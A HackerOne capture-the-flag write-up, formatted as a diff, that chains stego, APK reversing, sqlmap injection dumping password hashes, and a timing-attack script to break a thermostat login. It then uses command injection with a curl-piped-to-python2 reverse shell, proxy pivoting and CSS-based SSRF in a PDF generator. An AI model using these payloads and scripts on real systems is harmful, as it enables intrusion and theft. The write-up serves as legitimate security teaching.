@@ -1,0 +1,867 @@
+ReportLink:https://hackerone.com/reports/509080
+WeaknessName:File and Directory Information Exposure
+Reporter:https://hackerone.com/stong
+ReportedTo:50m-ctf(50m-ctf)
+BountyAmount:
+Severity:critical
+State:Closed
+DateOfDisclosure:08.04.2019 15:56:21
+
+Summary:
+
+## Summary:
+An attacker is able to download local files on the Accounting server due leveraging improper input sanitization in the Invoice PDF generator. In the same fashion an attacker is also able to issue server-side requests on the Accounting server through user-controlled CSS, possibly leading to further exploitation.
+
+An attacker is able to execute remote code on the FliteThermostat admin control panel's server due to a command injection vulnerability. Said control panel's authentication can be broken using a timing attack. Lastly, an attacker is able to read the contents of the thermostat database due to a SQL injection vulnerability.
+
+## Steps To Reproduce:
+Many of my friends are deep into web security, but this is my first time really getting my toes wet :D
+I did well on h1-702-ctf last year, so I wanted to try it again this year!
+I will be detailing the process I took using a "CTF-style" writeup, which is probably more verbose than a usual bug-bounty writeups. Hopefully though, it will more clearly explain the thought process and intuition I followed. Plus, this is a "CTF" right?
+
+### (0x00) Baby Steps.
+I found out about this challenge from my friend Jazzy, who linked me [this tweet](https://twitter.com/Hacker0x01/status/1100543680383832065). To be honest, I actually didn't realize that the challenge began with the image embedded with the tweet until I did more recon and found [Cody Brocious's Twitter](https://twitter.com/daeken/status/1100634878490656768). Then it was clear that we were supposed to look for data hidden in the image.
+
+Clearly there's some binary text in the background. The first thing I noticed was that the data was regular, because of the equal spacing between the underscores in the image. The text wrapping leads to the formation of a linear pattern artifact.
+
+{F440492}
+
+Since each chunk seems to be the same, thankfully we only need to transcribe one reptition of this pattern, not the whole image. Transcribing this, we get the data:
+
+```
+7A 6C 69 62 2B 78 9C CB 28 29 29 28 B6 D2 D7 4F  zlib+xœË())(¶Ò×O
+CA 2C D1 4B C9 D7 CF 30 2C C9 48 2D CA 05 00 5B  Ê,ÑKÉ×Ï0,ÉH-Ê..[
+4F 07 F4 7A 6C 69 62 2B 78 9C CB 28 29 29 28 B6  O.ôzlib+xœË())(¶
+```
+
+The data announces that it's zlib compressed, but we can also tell from the `78 9C` magic at offset 5. We cut off the first five bytes and decompress:
+
+```
+$ echo "78 9C CB 28 29 29 28 B6 D2 D7 4F CA 2C D1 4B C9 D7 CF 30 2C C9 48 2D CA 05 00 5B 4F 07 F4 7A 6C 69 62 2B 78 9C CB 28 29 29 28 B6" | xxd -r -p | openssl zlib -d; echo
+https://bit.do/h1therm
+```
+
+Cool! So we have a URL to work with now. I also looked for LSB stego, which is typical for this type of challenge.
+
+{F440489}
+
+There is regular data in the LSB of the red, green, and blue planes. Extracting this, we see the same data as earlier.
+
+{F440490}
+
+### (0x01) h1therm
+
+The url from earlier is a shortened URL which leads to a [grdive link](https://drive.google.com/file/d/1u5Mg1xKJMrW4DMGaWtBZ1TJKPdvqCWdJ/view) of an APK, h1thermostat.apk. Okay, so looks like we will need to do some managed-code reversing. APK's are essentially zip files, so let's take a peek inside.
+
+```
+$ unzip -l h1thermostat.apk
+Archive:  h1thermostat.apk
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+     3188  1980-00-00 00:00   AndroidManifest.xml
+       87  1980-00-00 00:00   META-INF/MANIFEST.MF
+      ...
+  3012436  1980-00-00 00:00   classes.dex
+      ...
+    15132  1980-00-00 00:00   res/mipmap-xxxhdpi-v4/ic_launcher_round.png
+   333076  1980-00-00 00:00   resources.arsc
+---------                     -------
+  4835993                     568 files
+```
+
+Looks like we are dealing with a .dex file, which we will need to decompile to .class files to decompile.
+Luckily there is a good tool for this, dex2jar. 
+
+```
+$ dex-tools-2.1-SNAPSHOT\d2j-dex2jar.bat classes.dex
+dex2jar classes.dex -> ./classes-dex2jar.jar
+$ jda classes-dex2jar.jar
+```
+
+Now let's analyze this binary. My preferred tool for Java reversing is JDA, which helpfully displays decompiled output side-by-side with Bytecode or an intermediate representation. Looking through a list of strings, we see `ttp://35.243.186.41/`, `username`, `password`, `cmd`, and `getTemp`. Judging from this, I bet we're dealing with a login API. So, let's just try POSTing to it and see what happens.
+
+```
+$ curl -X POST http://35.243.186.41/
+D7x4a8mJ/xcxoiH0vPNa6bhXAs/4rCXTORPrJK9wSPzD32NZRiZTgIWq0kjqQpLsUd87ao2/zlkoDu9PfAjs2g==
+$ curl -X POST http://35.243.186.41/ | base64 -d | xxd
+00000000: d2a9 88d7 ae25 4a73 2c5d d4af 36bf 2bc9  .....%Js,]..6.+.
+00000010: 8bdc 4e7f 539b cade d8e1 d18d 1e1b ccb4  ..N.S...........
+00000020: 5ef7 82ff 39b3 9ae4 d261 5a41 b09e 0ec8  ^...9....aZA....
+00000030: 5a1b 3fe4 368a 65c1 b3fe 4669 1092 1c36  Z.?.6.e...Fi...6
+```
+
+Umm...okay. This is high-entropy data. I guess we need to read the source code. The last four strings, `username`, `password`, `cmd`, and `getTemp`, are used in the clas LoginActivity, which simply builds a payload from the login form. The payload is a JSON object that looks like `{"username": "admin", "password": "1234", "cmd": "getTemp"}`. The PayloadRequest class actually performs the request, so we will analyze this class in greater detail.
+
+```java
+public class PayloadRequest extends Request {
+    private final Listener mListener;
+    private final HashMap mParams;
+
+    public PayloadRequest(JSONObject var1, final Listener var2) throws Exception {
+        super(1, "http://35.243.186.41/", new ErrorListener() {
+            public void onErrorResponse(VolleyError var1) {
+                var2.onResponse("Connection failed");
+            }
+        });
+        this.mListener = var2;
+        this.mParams = new HashMap();
+        this.mParams.put("d", this.buildPayload(var1));
+    }
+
+    private String buildPayload(JSONObject var1) throws Exception {
+        SecretKeySpec var2 = new SecretKeySpec(new byte[]{56, 79, 46, 106, 26, 5, -27, 34, 59, -128, -23, 96, -96, -90, 80, 116}, "AES");
+        byte[] var3 = new byte[16];
+        (new SecureRandom()).nextBytes(var3);
+        IvParameterSpec var4 = new IvParameterSpec(var3);
+        Cipher var5 = Cipher.getInstance("AES/CBC/PKCS5Padding");
+        var5.init(1, var2, var4);
+        byte[] var6 = var5.doFinal(var1.toString().getBytes());
+        byte[] var7 = new byte[var6.length + 16];
+        System.arraycopy(var3, 0, var7, 0, 16);
+        System.arraycopy(var6, 0, var7, 16, var6.length);
+        return Base64.encodeToString(var7, 0);
+    }
+
+    protected Response parseNetworkResponse(NetworkResponse var1) {
+        try {
+            String var2 = new String(var1.data);
+            byte[] var3 = Base64.decode(var2, 0);
+            byte[] var9 = new byte[16];
+            System.arraycopy(var3, 0, var9, 0, 16);
+            byte[] var6 = new byte[var3.length - 16];
+            System.arraycopy(var3, 16, var6, 0, var3.length - 16);
+            SecretKeySpec var11 = new SecretKeySpec(new byte[]{56, 79, 46, 106, 26, 5, -27, 34, 59, -128, -23, 96, -96, -90, 80, 116}, "AES");
+            IvParameterSpec var4 = new IvParameterSpec(var9);
+            Cipher var10 = Cipher.getInstance("AES/CBC/PKCS5Padding");
+            var10.init(2, var11, var4);
+            var9 = var10.doFinal(var6);
+            String var7 = new String(var9);
+            JSONObject var12 = new JSONObject(var7);
+            if (var12.getBoolean("success")) {
+                return Response.success((Object)null, this.getCacheEntry());
+            } else {
+                Response var8 = Response.success(var12.getString("error"), this.getCacheEntry());
+                return var8;
+            }
+        } catch (Exception var5) {
+            return Response.success("Unknown", this.getCacheEntry());
+        }
+    }
+}
+
+```
+
+Just as we expected, this class does cryptography with a hardcoded key on the request and response bodies. It encrypts the payload and encodes it as base64, passing it as the parameter `d`. Let's quickly implement this behavior into a transparent reverse proxy so we can actually access the endpoint and play with it (Twisted FTW).
+
+```python
+from twisted.internet import reactor
+from twisted.web import proxy, server
+from twisted.web.resource import EncodingResourceWrapper, Resource
+from io import BytesIO as StringIO
+
+from urllib import urlencode
+from base64 import b64decode, b64encode
+import json
+from Crypto.Cipher import AES
+
+# https://stackoverflow.com/questions/12562021/aes-decryption-padding-with-pkcs5-python
+BS = 16
+pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS) 
+unpad = lambda s : s[0:-ord(s[-1])]
+
+class AESCipher:
+    def __init__( self, key ):
+        self.key = key.decode("hex")
+
+    def encrypt( self, raw ):
+        raw = pad(raw)
+        iv = 'A' * 16
+        cipher = AES.new( self.key, AES.MODE_CBC, iv )
+        return iv + cipher.encrypt( raw )
+
+    def decrypt( self, enc ):
+        iv  = enc[:16]
+        enc = enc[16:]
+        cipher = AES.new(self.key, AES.MODE_CBC, iv )
+        return unpad(cipher.decrypt( enc))
+
+class CryptEncoderFactory(object):
+    cipher = AESCipher('384f2e6a1a05e5223b80e960a0a65074')
+
+    def encoderForRequest(self, request):
+        payload = json.dumps({k:v[0] for k,v in request.args.items()})
+        print payload
+        encoded_payload = urlencode({'d': b64encode(self.cipher.encrypt(payload))})
+        print encoded_payload
+        request.content = StringIO(encoded_payload)
+        request.requestHeaders.removeHeader('content-length')
+        request.requestHeaders.setRawHeaders('content-length', [str(len(encoded_payload))])
+        return CryptEncoder(request, self.cipher)
+
+class CryptEncoder(object):
+    def __init__(self, request, cipher):
+        self.request = request
+        self.cipher = cipher
+
+    def encode(self, data):
+        print data
+        try:
+            decrypted = self.cipher.decrypt(b64decode(data))
+            self.request.responseHeaders.removeHeader('content-length')
+            self.request.responseHeaders.setRawHeaders('content-length', [str(len(decrypted))])
+            print decrypted
+            return decrypted
+        except Exception as e:
+            print 'Failed to decrypt response:',e
+            return data
+
+    def finish(self):
+        return ''
+
+class EncoderFactoryFactory(object):
+    def __init__(self, encoders):
+        self.encoders = encoders
+
+    def wrap(self, wrapped):
+        class CryptingReverseProxy(proxy.ReverseProxyResource, object):
+            def __init__(wrapped_self, backend):
+                super(CryptingReverseProxy, wrapped_self).__init__(backend.host, backend.port, backend.path, backend.reactor)
+            
+            def getChild(wrapped_self, path, request):
+                return self.wrap(super(CryptingReverseProxy, wrapped_self).getChild(path, request))
+
+        return EncodingResourceWrapper(CryptingReverseProxy(wrapped), self.encoders)
+
+backend = proxy.ReverseProxyResource('35.243.186.41', 80, '')
+wrapper = EncoderFactoryFactory([CryptEncoderFactory()])
+site = server.Site(wrapper.wrap(backend))
+reactor.listenTCP(8001, site)
+reactor.run()
+```
+
+The implementation is not very clean, but it is very fast. Anyways let's test our endpoint!
+
+```
+$ curl "http://localhost:8001" -X POST --data "username=admin&password=lol123&cmd=getTemp"
+"success": false, "error": "Invalid username or password"}
+$ curl "http://localhost:8001" -X POST --data "username=admin&password=password&cmd=getTemp"
+{"temperature": 73, "success": true}
+$ curl "http://localhost:8001" -X POST --data "username=admin&password=password&cmd=getTempp"
+{"success": false, "error": "Unknown command"}
+$ curl "http://localhost:8001" -X POST --data "username=admin&password=password&cmd=setTemp"
+{"success": false, "error": "Missing temperature"}
+$ curl "http://localhost:8001" -X POST --data "username=admin&password=password&cmd=setTemp&temp=50"
+{"success": true}
+```
+
+LOL nice password. Let's check for SQL injection.
+
+```
+$ python sqlmap.py -u "http://localhost:8001" --method=POST --data="username=admin&password=admin&cmd=setTemp&temp=50" --level 5 --risk 3
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.3.2.31#dev}
+|_ -| . [']     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 23:24:00 /2019-03-12/
+
+[23:24:18] [INFO] POST parameter 'username' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable
+[23:24:40] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
+[23:24:19] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
+sqlmap identified the following injection point(s) with a total of 772 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: username=admin' AND 6107=(SELECT (CASE WHEN (6107=6107) THEN 6107 ELSE (SELECT 4219 UNION SELECT 9192) END))-- ZaDb&password=admin&cmd=setTemp&temp=50
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: username=admin' AND SLEEP(5)-- rYre&password=admin&cmd=setTemp&temp=50
+---
+[23:25:11] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx 1.15.8
+back-end DBMS: MySQL >= 5.0.12
+[23:25:11] [INFO] fetched data logged to text files under '/root/.sqlmap/output/localhost'
+
+[*] ending @ 23:25:11 /2019-03-12/
+```
+
+Nice. Let's dump everything!
+
+```
+$ python sqlmap.py -u "http://localhost:8001" --method=POST --data="username=admin&password=admin&cmd=setTemp&temp=50" --dump --threads 5
+Database: flitebackend
+Table: users
+[2 entries]
++----+----------+---------------------------------------------+
+| id | username | password                                    |
++----+----------+---------------------------------------------+
+| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+| 2  | sevenate | c5b1d550b588178c4bb321069fb688ab (nine10)   |
++----+----------+---------------------------------------------+
+
+Database: flitebackend
+Table: devices
+[151 entries]
++-----+-----------------+
+| id  | ip              |
++-----+-----------------+
+| 1   | 251.11.33.68    |
+| 2   | 10.143.156.45   |
+       --- snip ---
+| 150 | 192.88.99.145   |
+| 151 | 192.88.99.104   |
++-----+-----------------+
+```
+
+Notice the weak hashes. We also see a table `devices` which apparently is just a list of IP addresses.
+However, looking at the list the majority of them seem to be either in private ranges or not routed.
+To clean up this list, I used a nmap ping scan.
+
+```
+$ stdbuf -oL nmap -sn -vvv -iL hosts.txt | tee scan.txt
+Starting Nmap 7.40 ( https://nmap.org ) at 2019-03-17 10:38 EST
+Initiating Ping Scan at 20:08
+Scanning 104.196.12.98 [4 ports]
+Completed Ping Scan at 20:08, 0.22s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 20:08
+Completed Parallel DNS resolution of 1 host. at 20:08, 0.02s elapsed
+DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 2, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating SYN Stealth Scan at 20:08
+Scanning 98.12.196.104.bc.googleusercontent.com (104.196.12.98) [1 port]
+Discovered open port 80/tcp on 104.196.12.98
+Completed SYN Stealth Scan at 20:08, 0.22s elapsed (1 total ports)
+Nmap scan report for 98.12.196.104.bc.googleusercontent.com (104.196.12.98)
+Host is up, received reset ttl 55 (0.038s latency).
+Scanned at 2019-03-17 10:38:23 EST for 1s
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack ttl 55
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds
+           Raw packets sent: 5 (196B) | Rcvd: 7 (542B)
+```
+
+Really? Only 1 host is up, and it has http server? This must be the path forwards.
+
+### (0x02) FliteThermostat, part I
+
+We are first greeted by what appears to be a login page.
+
+{F440494}
+
+Looking at the webpage's source code, we see the bulk of the functionality is implemented in `login.js`:
+
+```javascript
+function stream(key) {
+	this.b = [];
+	for(var i = 0; i < 256; ++i)
+		this.b[i] = i;
+	var j = 0;
+	for(var i = 0; i < 256; ++i) {
+		j = (j + this.b[i] + key.charCodeAt(i % key.length)) & 0xFF;
+		var t = this.b[i];
+		this.b[i] = this.b[j];
+		this.b[j] = t;
+	}
+	this.a = 0;
+	this.c = 0;
+}
+
+stream.prototype.next = function() {
+	this.a = (this.a + 1) & 0xFF;
+	this.c = (this.c + this.b[this.a]) & 0xFF;
+	var t = this.b[this.a];
+	this.b[this.a] = this.b[this.c];
+	this.b[this.c] = t;
+	return this.b[(this.b[this.a] + this.b[this.c]) & 0xFF];
+};
+
+function e(x) {
+	var s = new stream(x);
+	var ox = '';
+	for(var i = 0; i < x.length; ++i)
+		ox += String.fromCharCode(s.next() ^ x.charCodeAt(i));
+	return ox;
+}
+
+function hash(x) {
+	x += '\x01\x00';
+	while((x.length & 0xFF) != 0)
+		x += String.fromCharCode((x.length & 0xFF) ^ x.charCodeAt[x.length & 0xFF]);
+	
+	var h = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
+	for(var i = 0; i < x.length; i += 32) {
+		var c = e(x.substring(i, i + 32));
+		for(var j = 0; j < 32; ++j)
+			h[j] ^= c.charCodeAt(j);
+	}
+
+	var hs = '';
+	for(var i = 0; i < 32; ++i)
+		hs += String.fromCharCode(h[i]);
+	return hs;
+}
+
+function fhash(x) {
+	for(var i = 0; i < 256; ++i)
+		x = hash(x);
+	var h = '';
+	for(var i = 0; i < 32; ++i) {
+		var t = x.charCodeAt(i).toString(16);
+		if(t.length == 1)
+			t = '0' + t;
+		h += t;
+	}
+	return h;
+}
+
+function login() {
+	document.getElementById('hash').value = fhash(
+		document.getElementById('username').value +
+		'\x05\0\x06' + 
+		document.getElementById('password').value
+	);
+	document.getElementById('form').submit();
+}
+```
+
+This is a crappy hash function based on multiple rounds of the RC4 stream cipher, where the key is the input data. However, I could not find any obvious flaws that while playing with this function. Instead, let's play with the server and see if we can do anything interesting.
+
+As before, I implemented another reverse proxy; however, this proved to not be useful as Sqlmap didn't find any vulnerabilities. Plus, why would there be 2 SQLi challenges in a row? Taking a step back, one particular thing that bothered me was that we were authenticating using a hash, rather than username and password credentials. Why bother sending a hash? And if it's only hashed client-side, that defeats the purpose of hashing anyways, since if the hashes are ever stolen, you can break into people's accounts.
+
+Here is the intuition I had: First, assume the application is exploitable. If the problem isn't SQLi, and it isn't cryptographic, then there must be some kind of logical weakness in the server's app. **IDEALLY, what would the server's code look like?** In my head, I pictured some pseudocode like this:
+
+```
+if hardcoded_hash == request.get_param('hash'):
+	authenticate()
+else:
+	fail()
+```
+
+In that case, the weakness must lie in the comparison itself. Otherwise, the solution to this challenge would have to be something other than a vulnerability in the webapp's programming. First, I thought of the PHP type juggling comparison bug, where strings starting with "0e" would be coerced to floats, and lead to faulty comparisons. But checking the 404 page quickly dispelled that idea.
+
+{F440488}
+
+This doesn't look like PHP. This looks like Flask. OK, then. How else could the comparison be weak? Can we leak information about the hardcoded_hash? I was out of any other ideas, so I tried doing a timing attack on the string comparison. This almost never works, but hey, it's a CTF right? :)
+
+```python
+from scipy import stats
+import numpy
+import socket,time
+import random
+import threading
+
+def do_request(q_hash):
+	assert len(q_hash) == 64
+	request_data = """POST / HTTP/1.1
+Host: 104.196.12.98
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 69
+
+hash=""" + q_hash + '\n'
+	
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect(("104.196.12.98", 80))
+	start_time = time.time()
+	s.send(request_data)
+	resp = s.recv(1)
+	elapsed = time.time() - start_time
+	s.shutdown(socket.SHUT_RDWR)
+	s.close()
+	return elapsed
+
+def generate_hash(prefix, val):
+	q_hash = prefix + ('%02x' % val)
+	q_hash += '00' * (32-len(q_hash)/2)
+	return q_hash
+
+def do_sample(prefix, values):
+	sample = []
+	for val in values:
+		time.sleep(0.1)
+		q_hash = generate_hash(prefix, val)
+		elapsed = do_request(q_hash)
+		sample.append(elapsed)
+		print q_hash, elapsed
+		# if numpy.var(sample) > 0.001:
+		# 	print 'This sample is garbage'
+		# 	break
+	return sample
+
+def stable_sample(prefix, values):
+	while True:
+		sample = do_sample(prefix, values)
+		mean = numpy.mean(sample)
+		var = numpy.var(sample)
+		print 'mu, sigma: ', mean, var
+		if var > 0.001:
+			print 'Sample variance too high. Try again.'
+		else:
+			return sample
+
+num_threads = 0
+
+def test_val(pop_mean, prefix, val, cands):
+	global num_threads
+	print '[*] Testing %02x' % (val,)
+	# sample = stable_sample(prefix, [val] * 1)
+	sample = do_sample(prefix, [val])[0]
+	if sample - pop_mean < 0.4:
+		print '[-] Boring (mean close to population)'
+		print
+	else:
+		# t, p = stats.ttest_ind(pop_sample, sample)
+		# print 'p =', p
+		# if p < 0.001:
+		print '[+] This is a candidate!'
+		cands.append(val)
+		# else:
+			# print '[-] Boring'
+	num_threads -= 1
+
+def do_round(prefix, to_test):
+	global num_threads
+	# print '[*] Collecting a population sample'
+	# pop_sample = stable_sample(prefix, [random.randint(0,255) for i in range(2)])
+	pop_mean = 0.5 + len(prefix) / 4.0
+	print 'Expecting delay of %f seconds' % (pop_mean)
+	print
+	cands = []
+	for val in to_test:
+		while num_threads >= 20:
+			time.sleep(0.1)
+		new_thread = threading.Thread(target=test_val, args=(pop_mean, prefix, val, cands))
+		new_thread.daemon = True
+		new_thread.start()
+		num_threads += 1
+		print
+		time.sleep(1)
+	while num_threads > 0:
+		time.sleep(0.1)
+	print '[*] Candidates:', cands
+	return cands
+
+def hack():
+	prefix = 'f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde7'
+	while len(prefix) < 64:
+		print '[*] Round start:', prefix
+		cands = range(0x00, 0xff)
+		while len(cands) > 1:
+			cands = do_round(prefix, cands)
+			if not cands:
+				print 'Ran out of candidates!!'
+				return
+		prefix += '%02x' % (cands[0],)
+	return prefix
+
+print 'Result: ' + hack()
+
+# print ('%02x' % val), sum(samples)/len(samples), samples
+```
+
+It's pretty obvious that the timing attack worked after I went through all the hashes from '00XXXXX...' to 'FFXXXXX...'. Any hash starting with 'f9' was noticably slower; the response time was delayed by about 0.5 seconds. Then I tried it for 'f900XXXX...' to 'f9FFXXXX', and 'f986' was delayed by about 1.0 seconds. I guess we are lucky that the remote server is very consistent with its delays. Unfortunately, the server's connection is really unstable so we often need multiple tries to make sure that we are sure whether a guess is correct or not.
+
+After a looooooooooooooooooooong time, we finally get the hash `f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8`, which we are able to log in with! It's kind of like a pass the hash attack, as we don't even need the plaintext credentials.
+
+### 0x03 FliteThermostat, part II
+
+I used Burp Suite to make the login request, then copied the cookies into Firefox. Now this screen greets us:
+
+{F440486}
+
+The temperature control page wasn't really interesting. One interesting thing I noticed was that it only accepted valid numbers for its API parameter. But you could also use underscores in numbers (e.g. `12_345 = 12345`) which indicated that this was a Python3 Flask server.
+
+What piqued my interest was the Check For Updates page. If we could subvert the firmware update, we could get RCE then!
+
+{F440487}
+
+Let's see if we can control the host and port for this connection.
+
+```
+GET /update?port=1234
+Connecting to http://update.flitethermostat:1234/ and downloading update manifest
+```
+
+Nice, that one was an easy guess. I tried playing with this parameter, but unfortunately it has to be a valid integer. :( The following parameter, on the other hand, was NOT an easy guess.
+
+```
+GET /update?port=1234&update_host=perfect.blue
+Connecting to http://perfect.blue:1234/ and downloading update manifest
+```
+
+This told me that this update checker doesn't actually work: I setup `nc -lvp 1234` on that host, but I didn't receive a connection. In that case, what could we do?
+
+Unlike before, this parameter isn't validated. So let's just try injecting some symbols to see if anything breaks.
+
+```
+GET /update?port=1234&update_host=lol~!@#$%^&*()_+-=[]\{}|:%22;'%3C%3E?,./
+Connecting to http://lol~!@:1234/ and downloading update manifest
+```
+
+OK, looks like it cut off the input at `#`. I wonder if this is command injection?
+
+```
+/update?port=1234&update_host=lol;echo a
+Connecting to http://lol and downloading update manifest
+...
+...
+...
+Could not connect
+a:1234/
+```
+
+```
+/update?port=1234&update_host=lol$PATH
+Connecting to http://lol/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:1234/ and downloading update manifest
+...
+...
+...
+Could not connect
+```
+
+Yup...so my hypothesis is that the server probably does something like `exec("check_update http://" + host ":" + str(port)")`. Let's upgrade this to a reverse shell and pop this box!
+
+```
+GET /update?port=12345&update_host=x;curl%20https://raw.githubusercontent.com/perfectblue/attack-defense-tools/master/chippyshell.py%20|%20python2;echo%20
+
+On server:
+root@perfect.blue:~# socat file:`tty`,raw,echo=0 tcp-listen:6969
+  @@@@@@@ @@@  @@@ @@@ @@@@@@@  @@@@@@@  @@@ @@@  @@@ @@@@@@  @@@@@@  @@@@@@@
+ !@@      @@!  @@@ @@! @@!  @@@ @@!  @@@ @@! !@@  @@@     @@!     @@!      @@!
+ !@!      @!@!@!@! !!@ @!@@!@!  @!@@!@!   !@!@!   !@!  @!!!:   @!!!:      @!!
+ :!!      !!:  !!! !!: !!:      !!:        !!:    !!!     !!:     !!:  .!!:
+  :: :: :  :   : : :    :        :         .:     :   ::: ::  ::: ::  : :
+             ~[  P R I V 8  C O N N E C T   B A C K   S H E L L  ]~
+Linux 834f8ab4b851 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux
+uid=0(root) gid=0(root) groups=0(root)
+root@d090cd50ec64:~# ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+170: eth0@if171: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:ac:19:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 172.25.0.3/16 brd 172.25.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+root@d090cd50ec64:~# df -h /
+Filesystem      Size  Used Avail Use% Mounted on
+overlay         9.8G  3.2G  6.1G  35% /
+tmpfs            64M     0   64M   0% /dev
+tmpfs           7.4G     0  7.4G   0% /sys/fs/cgroup
+/dev/sda1       9.8G  3.2G  6.1G  35% /etc/hosts
+shm              64M     0   64M   0% /dev/shm
+tmpfs           7.4G     0  7.4G   0% /proc/acpi
+tmpfs           7.4G     0  7.4G   0% /sys/firmware
+root@d090cd50ec64:~# ls
+Dockerfile   login.js  requirements.txt  temptarget  uwsgi.ini
+__pycache__  main.py   templates	 update.sh
+```
+
+Nice. A few things to note: based on `ip addr`, we're probably inside Docker. Also, that """update checker""" was a total scam:
+
+```bash
+#!/bin/bash
+
+echo "Connecting to $* and downloading update manifest"
+echo "..."
+echo "..."
+echo "..."
+echo "Could not connect"
+```
+
+And the earlier hypothesis about the timing attack was pretty close!
+
+```python
+validLogin = 'f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8'
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+	if 'loggedIn' in session and session['loggedIn']:
+		return redirect('/main')
+	error = False
+	if request.method == 'POST':
+		h = request.form['hash']
+		if len(h) != 64:
+			error = True
+		else:
+			for i in range(0, 64, 2):
+				time.sleep(0.5)
+				if validLogin[i:i+2] != h[i:i+2]:
+					error = True
+					break
+		if not error:
+			session['loggedIn'] = True
+			return redirect('/main')
+
+	return render('index', page='login', error='Invalid username or password' if error else None)
+```
+
+At this point, I couldn't find any other interesting stuff on this box so that means we need to pivot. I also tried Docker escapes, but I [guess that wasn't the right idea, lol](https://twitter.com/daeken/status/1104857106061119489?s=19). Since we're on a LAN, let's scan for other hosts. But because we're in Docker, we can't listen on any new ports. If we'd like to pivot through this box, we need to setup a backconnect proxy server. I like to use `rpivot`.
+
+```
+root@perfect.blue:~/rpivot# python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
+root@d090cd50ec64:~# cd /dev/shm
+root@d090cd50ec64:/dev/shm# git clone https://github.com/klsecservices/rpivot
+root@d090cd50ec64:/dev/shm# python client.py --server-ip perfect.blue --server-port 9999
+```
+
+This lands us a nice SOCKS4 proxy. But let's upgrade this to a SOCKS5 and HTTP proxy so it's a bit comfier. Nothing pchains can't handle.
+
+```
+root@perfect.blue:~# proxychains ../microsocks/microsocks -i 127.0.0.1 -p 1081
+root@perfect.blue:~# hpts -s 127.0.0.1:1081 -p 8080
+```
+
+Now, we can proxychains nmap 172.25.0.0/16 for other hosts. And almost immediately, we find a neighbor on the LAN (this container restarted later so the IP address is different). And it is also listening on port 80.
+
+### (0x04) Accounting
+
+Using the HTTP proxy we just setup, we navigate over to http://172.28.0.3/ and find this:
+
+{F440491}
+
+This looks sensitive. Reports and Invoices are both gated behind a login page, and there is no obvious SQLi. Luckily with some directory searching we are able to find http://172.28.0.3/invoices/new:
+
+{F440493}
+
+Now we're talking! I bet this is vuln. Let's quickly glance over the source code to make sure there's no obvious problems.
+
+I checked the PDf output for metadata, because I wanted to see how the PDF was being generated. That way I could check if there were known vulnerabilities in that library.
+
+```xml
+$ dumppdf.py -a pdfize.pdf | less
+<object id="26">
+<dict size="2">
+<key>Producer</key>
+<value><string size="39">cairo 1.14.8 &#40;http://cairographics.org&#41;</string></value>
+<key>Creator</key>
+<value><string size="39">cairo 1.14.8 &#40;http://cairographics.org&#41;</string></value>
+</dict>
+</object>
+```
+
+A quick search for "Python web page pdf cairo" showed the library WeasyPrint. Let's keep this in mind.
+
+Next, looking at the requests in Burp, the most interesting thing I noticed was that there was some CSS that we could control in the request parameters:
+
+```
+GET http://172.28.0.3/invoices/preview?d={"companyName":"a","email":"b","invoiceNumber":"c","date":"d","items":[["1","a","b","10"]],"styles":{"body":{"background-color":"white"}}}
+
+HTTP/1.1 200 OK
+...
+		body {
+			background-color: white;
+		}
+...
+```
+
+Can we get SSRF using this?
+
+```
+GET http://172.28.0.3/invoices/pdfize?d={"companyName":"a","email":"b","invoiceNumber":"c","date":"d","items":[["1","a","b","10"]],"styles":{"body":{"background-image":"url('http://perfect.blue:12345/lol.png')"}}}
+
+root@perfect.blue:~## nc -lvp 12345
+Listening on [0.0.0.0] (family 0, port 12345)
+Connection from 98.12.196.104.bc.googleusercontent.com 47690 received!
+GET /lol.png HTTP/1.1
+Host: perfect.blue:12345
